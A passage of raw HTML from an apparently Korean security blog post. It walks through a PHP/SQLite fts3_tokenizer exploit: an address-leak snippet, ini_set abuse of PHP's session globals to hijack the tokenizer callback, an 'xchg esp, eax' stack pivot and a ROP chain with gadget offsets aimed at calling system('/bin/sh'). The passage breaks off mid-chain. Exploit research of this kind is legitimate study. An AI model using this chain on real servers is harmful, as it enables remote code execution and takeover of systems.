class-name\">SQLite3</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":memory:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"select hex(fts3_tokenizer('simple')) addr;\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token function\">fetchArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$leaked_addr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'addr'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$addr</span> <span class=\"token operator\">=</span> <span class=\"token function\">hexdec</span><span class=\"token punctuation\">(</span><span class=\"token function\">flip</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leaked_addr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<h3 id=\"fts3-tokenizer-callback\" style=\"position:relative;\"><a href=\"#fts3-tokenizer-callback\" aria-label=\"fts3 tokenizer callback permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>fts3 tokenizer callback</h3>\n<ul>\n<li>2번째 인자인 callback 주소를 컨트롤 하여 임의의 값으로 덮여 씌어진 것을 확인 할 수 있습니다.</li>\n<li><code class=\"language-text\">edi</code> 레지스터를 조작해 원하는 방향을 이동이 가능한 것을 확인할 수 있습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 80.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAAsTAAALEwEAmpwYAAACZklEQVQ4y32U6XKiUBSEMTHqGBVXXOOuiGzigrtGy8oyM+//Oj112sEKcWp+UBQXbt/vnO6D0u1PMBr7aHVs9AYe5FkfLzAczWE5Gwz02W29Wteh5prIFVoolLrI5pt4iOYQeczyLpdSqenQjQUMcwlvdqS4CBimD9Ne8V2jOUalNuShuUIb8R8akqkqEsnyveBLy0Sn52IyPZCqVO4hGivg8SnPD2KJIjcokcz1elBDVyAW3JWi1oM3O5Ck1bXRH05JKeUpShqFUgf5YpuH1ZtjKEqKm79ShQif0zVsdu8wnTWcyRazxSt2h08MjTkFaw0DWqWP5foC292i/mKw7GvpJSgRNUyYytSwWJ5JJX0TI2b+iW0QQSEtal1MpnvM/RMPLFcHbI2sxxKle8LV5g2Ot6Oo6+3gry909Uo4oqMiZLkbGiNmPMWLJJRehwSFcLv/oCmWsybJavt2E2y2LTosPRRno7H8/015TldZythaMXOmveazkIig9EyMu5qUokiQgH+aklLrOLz+IpmUG5giWRRBiZUEWXIqSRDyfLHDaH0VuglKGdP5kdPRG3rc6E73FJLcaZUBY2P9TYGU/50qJJhW6ziefnNKXG+P+fKMzf6DeSRh26KrfOefMbZXIbrvwiQUscFohr4+vY1gQChiQjgyfSZBSKWHwdQEojdT0moD++NP9tB2Nyx/e/ikQUEPJdjSBgm3ZFXyl0hqnOk7QsmU5E5ONqwlnMkO/uqCdtehq9ccdniQTIq4Xyr3SS1/njtBmQj5UEat0TTZ9GtUuognNTqayb5wTUi5KfhRRDJ3Jf8BBjCmWCl/LGYAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/21ee7ce62817f36943371acf662f8f00/37523/7.png\"\n        srcset=\"/static/21ee7ce62817f36943371acf662f8f00/e9ff0/7.png 180w,\n/static/21ee7ce62817f36943371acf662f8f00/f21e7/7.png 360w,\n/static/21ee7ce62817f36943371acf662f8f00/37523/7.png 720w,\n/static/21ee7ce62817f36943371acf662f8f00/83e77/7.png 889w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>하지만 해당 레지스터를 활용해서 Stack Pivot를 하기에는 어려움이 있기 때문에 <code class=\"language-text\">xOpen</code> 의 pInput을 트리거하는 방식으로 조작해보겠습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>xOpen<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>sqlite3_tokenizer <span class=\"token operator\">*</span>pTokenizer<span class=\"token punctuation\">,</span>\n\t<span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>pInput<span class=\"token punctuation\">,</span>\n\t<span class=\"token keyword\">int</span> nBytes<span class=\"token punctuation\">,</span>\n\tsqlite3_tokenizer_cursor <span class=\"token operator\">*</span><span class=\"token operator\">*</span>ppCursor\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>만약 xCreate 를 모두 제어하기 위해서는 xOpen을 제어할 수 있는 연속적인 메모리 데이터 3개 이상이 필요합니다.</li>\n<li>이를 위해서 <code class=\"language-text\">PHP.ini</code> list의 값을 설정합니다.</li>\n</ul>\n<p><strong>PHP.ini (Structure _php_ps_globals)</strong></p>\n<ul>\n<li>Expand PHP Module의 코드를 보면 해당 ini 구조체가 정의되어 있으며 이러한 자료구조는 프로세스 상에서 전역적으로 존재하고 <code class=\"language-text\">.bss</code> 섹션에 포함되어 있기 때문에 위치를 알 수 있으며 공격하는데 있어서 좋은 벡터입니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token comment\">// https://www.php.net/manual/en/ini.list.php</span>\n\n<span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_php_ps_globals</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>save_path<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>session_name<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>id<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>extern_referer_chk<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>entropy_file<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>cache_limiter<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">long</span> entropy_length<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">long</span> cookie_lifetime<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>cookie_path<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>cookie_domain<span class=\"token punctuation\">;</span>\n\tzend_bool  cookie_secure<span class=\"token punctuation\">;</span>\n\tzend_bool  cookie_httponly<span class=\"token punctuation\">;</span>\n\tps_module <span class=\"token operator\">*</span>mod<span class=\"token punctuation\">;</span>\n\tps_module <span class=\"token operator\">*</span>default_mod<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>mod_data<span class=\"token punctuation\">;</span>\n\tphp_session_status session_status<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">long</span> gc_probability<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">long</span> gc_divisor<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">long</span> gc_maxlifetime<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">int</span> module_number<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">long</span> cache_expire<span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>앞서 구조체에서 활용하는 필드는 빨간색으로 주석 처리한 부분을 사용할 예정이며, 포인터 구조와 정수 형태를 트리거할 수 있는 필드를 선정하여 가젯들이 적용할 수 있는 범위를 늘렸습니다.</li>\n<li>php.ini 항목을 조작하여 fts3 tokenizer 모듈 구조체를 조작할 수 있습니다.</li>\n</ul>\n<h3 id=\"fts3-tokenizer-두-번째-인자-ebp-레지스터-조작\" style=\"position:relative;\"><a href=\"#fts3-tokenizer-%EB%91%90-%EB%B2%88%EC%A7%B8-%EC%9D%B8%EC%9E%90-ebp-%EB%A0%88%EC%A7%80%EC%8A%A4%ED%84%B0-%EC%A1%B0%EC%9E%91\" aria-label=\"fts3 tokenizer 두 번째 인자 ebp 레지스터 조작 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>fts3 tokenizer 두 번째 인자 ebp 레지스터 조작</h3>\n<ul>\n<li>두 번쨰 인자 ebp 레지스터를 다양한 메모리 범위로 조작이 가능하기 때문에 php.ini 의 <code class=\"language-text\">ps_globals</code> 의 구조체를 사용하기 위해 <code class=\"language-text\">gc_probability</code> 필드의 주소를 지정하였고 해당 위치로 이동하기 에 있어 <code class=\"language-text\">-0x4</code> 바이트 연산을 해서 호출원에서 계산 된 오프셋을 조작하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 26.666666666666668%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAABJklEQVQY0z2Q2U7CYBCFf3YoLRQQWkpFUBarhbYsDdZSliIERaIhJt75/k9xzEyMVzOZzJz5zhGT+RreNILtBFwdbwm1eoNavYt2x0b3zkGl1oHZfoBuDCDJTeQlDbc9F4ZpIZmuoKH3eVeSdYgwOmLmb+F4IRbBC/ynHR/K5RbW23ds4jNEsoyR+4z98QKt2Udd6+Hy9YPl6hXpbA3+Ika8/2AIQUT2OMDAmsGdLFm4dW2hqBhYbU6I1m9IZap4HC1wOF74iIh3+0+MvZAJyRk9J2ciCA9wpxGG1pzFqCd85Y+QREmQIjmdv2GY92ybHlAcJNgfTjHzN1BUE4KGhaKOXKHxn082X2crlEmhqPERzeVSC5ncFUcghAKRKCGRUrkKIXP/CxNqjhNe+sh1AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/baacb06fc343009d4872d0068294f270/37523/8.png\"\n        srcset=\"/static/baacb06fc343009d4872d0068294f270/e9ff0/8.png 180w,\n/static/baacb06fc343009d4872d0068294f270/f21e7/8.png 360w,\n/static/baacb06fc343009d4872d0068294f270/37523/8.png 720w,\n/static/baacb06fc343009d4872d0068294f270/1e088/8.png 840w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>ps_globals의 <code class=\"language-text\">gc_probability</code>, <code class=\"language-text\">gc_divisor</code>, <code class=\"language-text\">gc_maxlifetime</code> 해당 필드는 셋 전부 long 타입을 갖는 필드 입니다.</li>\n<li><code class=\"language-text\">xOpen</code> 을 트리거하기 위해서는 정상적으로 <code class=\"language-text\">xCreate</code> 가 동작한 후에 <code class=\"language-text\">insert query</code> 가 실행되어야 합니다. 그렇기 때문에 fts3 table <code class=\"language-text\">simple</code> 의 <code class=\"language-text\">simple_create</code> 해시 테이블 주소를 콜백으로 변경하여 <code class=\"language-text\">xOepn</code> 함수로 갈 경로를 만들어 봅시다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 30.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABNklEQVQY02WRaU/CQBiEUa5KEGmB2tRCaWnlElpALqEC4RQbjSVoICpfTPT//4Ex+yYYDB8mu9njmdlZn1Xro1huQ9UqSKtlGPk6hGQWwXASslKErBTgDwrgE1mac5FLUkoyEBcyOA3wOPHHaWTytbsTNJojRGMylEwJb9svMuAiIqYLD9O5h0AogZtqF956R6Z8QoX7tEHPWRDsH9AZLtHtzSAkNWg5C++fP6hYPUoxW6zw4L5SWrvuYPvxDVWvUNrVeofByD0G1m4HqNp9RGNXkOQ8OefMGkJcCs5gSWIJC6UW3OcN1RCLp8ms1RkfA5udMay6A1EyYeYbmMxekNWrCJ+JYHt3/TkB2Rp7oigZOL9QKDE7f9Th/fARumFDN23qiXXkD/KUUJKv/z5lf2Gvw7VD4C+nJqeQLk/kqAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/6db69931f8bc72d39cf86bbb2ed4df15/37523/9.png\"\n        srcset=\"/static/6db69931f8bc72d39cf86bbb2ed4df15/e9ff0/9.png 180w,\n/static/6db69931f8bc72d39cf86bbb2ed4df15/f21e7/9.png 360w,\n/static/6db69931f8bc72d39cf86bbb2ed4df15/37523/9.png 720w,\n/static/6db69931f8bc72d39cf86bbb2ed4df15/5b481/9.png 846w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>현재 환경에서 <code class=\"language-text\">0xe3bbc0</code> 의 주소는 <code class=\"language-text\">simpleCreate</code> 객체를 가리키고 다음 <code class=\"language-text\">0x7fffffff</code> 두 값들은 임의로 집어넣은 값입니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 10.555555555555557%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAiUlEQVQI1x3MYQqCMACAUVPLFJVp22w6QZMpaCEhmD+6/7W+oHeA58WyI1UDWrSYvEGmBissVrSUeU1W1KTGEcuerHLEicG/SMKrJogU/vmG5+ecAoEfFnhiWNHTh6ed2eqRpRrYmonVjDgzcO8m1LwjlwO1HOj+TWFelI+Dst+R7ksiR4JI/tMfs4EzcOgpS4wAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/f4ca616e40d5344f5d77255f3092c4c6/37523/10.png\"\n        srcset=\"/static/f4ca616e40d5344f5d77255f3092c4c6/e9ff0/10.png 180w,\n/static/f4ca616e40d5344f5d77255f3092c4c6/f21e7/10.png 360w,\n/static/f4ca616e40d5344f5d77255f3092c4c6/37523/10.png 720w,\n/static/f4ca616e40d5344f5d77255f3092c4c6/cecac/10.png 728w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>php의 <code class=\"language-text\">ini_set</code> 메서드를 이용해서 각 전역 필드에 값을 넣어 줍니다.</li>\n<li>앞서 xOpen 을 활용하기 위해 세 개의 메모리 대역이 필요하다고 했는데 이를 <code class=\"language-text\">ps_globals</code> 필드를 활용하였습니다.</li>\n<li>필드의 값이 어디 부분에서 터지는지를 확인하기 위해 임의의 데이터를 넣은 결과 <code class=\"language-text\">eip</code> 레지스터를 조작할 수 있습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 37.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA7klEQVQoz5XSTXOCMBAG4BWtVgVSEFJUEAREHT9bqtVeOszYW///33mdrKPVg1M5bJI95MlmExomK7ivKYQVoG10Uam+oPpkX0LlWs3iuF7fC1KbiNroB1N87g8IhwvO1bzdHxBEc1DFfBglHkjHaPyO7+IX4+kG0hshTteYLXaQXnoD/lvhH5gj3xSI4iUaTReDaM647UTlwPqzy6Dq5e7rB344Q61uc55vC3i9rBzY0rvcM1WZCkcmjAhrAEP4IE2UexQiE0QGkuwNVidEz59AN/t8yBlT0CPYCdQEXzmbfHB1jozRaMrS3+UMHgF3Wbt/cgVUNgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/6227d5a0df36cef3a1d595e8b3994e79/37523/11.png\"\n        srcset=\"/static/6227d5a0df36cef3a1d595e8b3994e79/e9ff0/11.png 180w,\n/static/6227d5a0df36cef3a1d595e8b3994e79/f21e7/11.png 360w,\n/static/6227d5a0df36cef3a1d595e8b3994e79/37523/11.png 720w,\n/static/6227d5a0df36cef3a1d595e8b3994e79/c1328/11.png 866w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>해당 함수가 호출하는 호출 구간은 <code class=\"language-text\">call [edx+0xc]</code> 형태로 <code class=\"language-text\">edx</code> 레지스터를 기준으로 call이 되어지고 <code class=\"language-text\">eax</code> 레지스터에는 xOpen의 <code class=\"language-text\">insert in to query</code>의 value 값이 포함된 것을 확인할 수 있습니다.</li>\n</ul>\n<h3 id=\"stack-pivot를-이용한-payload-data-메모리-위치-변경-작업\" style=\"position:relative;\"><a href=\"#stack-pivot%EB%A5%BC-%EC%9D%B4%EC%9A%A9%ED%95%9C-payload-data-%EB%A9%94%EB%AA%A8%EB%A6%AC-%EC%9C%84%EC%B9%98-%EB%B3%80%EA%B2%BD-%EC%9E%91%EC%97%85\" aria-label=\"stack pivot를 이용한 payload data 메모리 위치 변경 작업 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Stack Pivot를 이용한 Payload data 메모리 위치 변경 작업</h3>\n<ul>\n<li>앞서 취약점을 활용하여 프로그램 카운터를 조작이 가능한 상태입니다.</li>\n<li>원하는 메모리 번지의 대역을 eax 레지스터가 참조하고 있는 구조</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 15%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAkUlEQVQI133OvQ6CMABFYbQtYpGflhRaDJEEq6iLvv/DHQODg4kON2f7cpO88hg3Ys0JJS1KWcRSaZGiRiiDyBwbUZNsq7VbaT79XmKLwGuYufvIo5t4hgtXNzL3kXOIxDAxDjd80dOVPXnmSH5gK3jQHqM7yr2j0i0291jdousjuhlXQImaNG3YpQ3iz7sFfAMSPEXyTROC+AAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/3ac23bc623be2a035e32088d57b9fee9/37523/12.png\"\n        srcset=\"/static/3ac23bc623be2a035e32088d57b9fee9/e9ff0/12.png 180w,\n/static/3ac23bc623be2a035e32088d57b9fee9/f21e7/12.png 360w,\n/static/3ac23bc623be2a035e32088d57b9fee9/37523/12.png 720w,\n/static/3ac23bc623be2a035e32088d57b9fee9/20982/12.png 778w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">insert into a value</code> 값으로 ROP를 수행할 수 있는 영역으로 만들기 위해 <code class=\"language-text\">XCHG</code> 가젯을 이용하여 eax 레지스터와 esp 레지스터를 체인하여 현재 프로그램 카운터가 생성된 페이로드 데이터의 메모리 대역으로 이동하도록 변경하였습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"wasm\"><pre class=\"language-wasm\"><code class=\"language-wasm\">xchg esp, eax;\nret;</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 23.333333333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAABF0lEQVQY01WQaU/CQBCGl0PkqCBqactRoeVubRHlKAQolpZYqIox4v//I6/ZMYT4YbKZ2Z1nnln2NHLRMyeoqn00dBuS0kbi4gZZQaaapLQQS1yjUKyhdm9AlJtg8QLuShrUuglR0imPJ4sUbBMcqJjJyQijI9yXCJeZEqRyG7u3HzjzgBr01iPC/RGD4RKMCTDtGfztAdZgDsauzkDXi8hKyFewWIWYznyksxJKchOe/46xsyFDbr8Nv2APF2AsB8Ny4G8/0e4+/wd6wQfK1S4BX/ffWLo7pNIilEqHjMdTj4Bq44HsOYgb9owJVus9Ov0RWCx/BmpNm9blEN7E4X9/qKCuWbT66XEydUt3fAA/efA6z0/AXze9iQhuLwfFAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/f542ba31671d5ad8462ff0a5e69c49ca/37523/13.png\"\n        srcset=\"/static/f542ba31671d5ad8462ff0a5e69c49ca/e9ff0/13.png 180w,\n/static/f542ba31671d5ad8462ff0a5e69c49ca/f21e7/13.png 360w,\n/static/f542ba31671d5ad8462ff0a5e69c49ca/37523/13.png 720w,\n/static/f542ba31671d5ad8462ff0a5e69c49ca/7de01/13.png 794w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"rop-기법을-활용하여-rce-취약점-수행\" style=\"position:relative;\"><a href=\"#rop-%EA%B8%B0%EB%B2%95%EC%9D%84-%ED%99%9C%EC%9A%A9%ED%95%98%EC%97%AC-rce-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%88%98%ED%96%89\" aria-label=\"rop 기법을 활용하여 rce 취약점 수행 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ROP 기법을 활용하여 RCE 취약점 수행</h3>\n<ul>\n<li>앞서 취약점 활용하여 원하는 가젯들을 체인할 수 있는 벡터를 마련하였습니다.</li>\n<li>중요한 사실은 RCE를 발생하기 위해서 “/bin/sh” 명령을 내리기 위해 문자열이 있는 메모리 공간이 있어야 합니다.</li>\n<li>읽기/쓰기 가 가능한 메모리 영역으로 문자열을 쓰기 위해 하드 코딩으로 문자열을 4바이트씩 끊어 가면서 메모리 상에 쓰고 마지막에 널 바이트를 추가합니다.</li>\n<li>시스템 라이브러리 함수를 호출할 때 해당 문자열의 포인터 주소를 불러와서 호출을 진행합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"wasm\"><pre class=\"language-wasm\"><code class=\"language-wasm\">## command move step <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>~<span class=\"token number\">5</span> repeat<span class=\"token punctuation\">)</span>\npop eax ; ret               --------> libsqlite3_gadget<span class=\"token punctuation\">(</span><span class=\"token number\">0x00305337</span><span class=\"token punctuation\">)</span> -> <span class=\"token keyword\">offset</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x82337</span><span class=\"token punctuation\">)</span>  -> server<span class=\"token punctuation\">(</span><span class=\"token number\">0xe9c337</span><span class=\"token punctuation\">)</span>\n;command<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>                 --------> CMD\npop edx ; ret               --------> libsqlite3_gadget<span class=\"token punctuation\">(</span><span class=\"token number\">0x00305e09</span><span class=\"token punctuation\">)</span> -> <span class=\"token keyword\">offset</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x82e09</span><span class=\"token punctuation\">)</span>  -> server<span class=\"token punctuation\">(</span><span class=\"token number\">0xe9ce09</span><span class=\"token punctuation\">)</span>\n;writable <span class=\"token keyword\">memory</span>            --------> libsqlite3+<span class=\"token punctuation\">(</span><span class=\"token number\">0x8eaa0</span><span class=\"token number\">-0x18</span><span class=\"token punctuation\">)</span>                         -> server<span class=\"token punctuation\">(</span><span class=\"token number\">0xea8a88</span>, <span class=\"token number\">0xea8a8c</span>, <span class=\"token number\">0xea8a90</span>, <span class=\"token number\">0xea8a94</span>, <span class=\"token number\">0xea8a98</span>,<span class=\"token number\">0xea8a9c</span>, <span class=\"token number\">0xea8aa0</span><span class=\"token 